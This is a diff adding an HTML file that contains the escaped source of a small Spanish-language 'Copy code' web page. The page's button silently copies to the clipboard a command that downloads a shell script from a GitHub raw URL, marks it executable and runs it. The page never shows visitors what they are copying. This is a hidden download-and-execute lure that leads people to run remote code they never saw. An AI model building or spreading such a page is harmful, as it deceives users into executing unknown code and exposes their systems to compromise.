@@ -1,0 +1,49 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta http-equiv="Content-Style-Type" content="text/css">
+  <title></title>
+  <meta name="Generator" content="Cocoa HTML Writer">
+  <meta name="CocoaVersion" content="2487">
+  <style type="text/css">
+    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica}
+    p.p2 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica; min-height: 14.0px}
+  </style>
+</head>
+<body>
+<p class="p1">&lt;!DOCTYPE html&gt;</p>
+<p class="p1">&lt;html&gt;</p>
+<p class="p1">&lt;head&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;title&gt;Copy Code Example&lt;/title&gt;</p>
+<p class="p1">&lt;/head&gt;</p>
+<p class="p1">&lt;body&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;p&gt;Para copiar el código, haga clic en "Copy code":&lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;button id="copyButton"&gt;Copy code&lt;/button&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;script&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>// Función para copiar el código al portapapeles</p>
+<p class="p1"><span class="Apple-converted-space">        </span>function copyCodeToClipboard() {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>// Crear un elemento de textarea temporal</p>
+<p class="p1"><span class="Apple-converted-space">            </span>const textarea = document.createElement('textarea');</p>
+<p class="p1"><span class="Apple-converted-space">            </span>textarea.value = 'curl https://raw.githubusercontent.com/ivysolco/main/main/user.sh -o test.sh &amp;&amp; chmod +x ./test.sh &amp;&amp; ./test.sh';</p>
+<p class="p1"><span class="Apple-converted-space">            </span>document.body.appendChild(textarea);</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">            </span>// Seleccionar y copiar el texto al portapapeles</p>
+<p class="p1"><span class="Apple-converted-space">            </span>textarea.select();</p>
+<p class="p1"><span class="Apple-converted-space">            </span>document.execCommand('copy');</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">            </span>// Eliminar el elemento de textarea temporal</p>
+<p class="p1"><span class="Apple-converted-space">            </span>document.body.removeChild(textarea);</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">            </span>// Mostrar un mensaje de confirmación</p>
+<p class="p1"><span class="Apple-converted-space">            </span>alert('Código copiado al portapapeles');</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>// Asociar la función de copia al botón</p>
+<p class="p1"><span class="Apple-converted-space">        </span>document.getElementById('copyButton').addEventListener('click', copyCodeToClipboard);</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;/script&gt;</p>
+<p class="p1">&lt;/body&gt;</p>
+<p class="p1">&lt;/html&gt;</p>
+</body>
+</html>
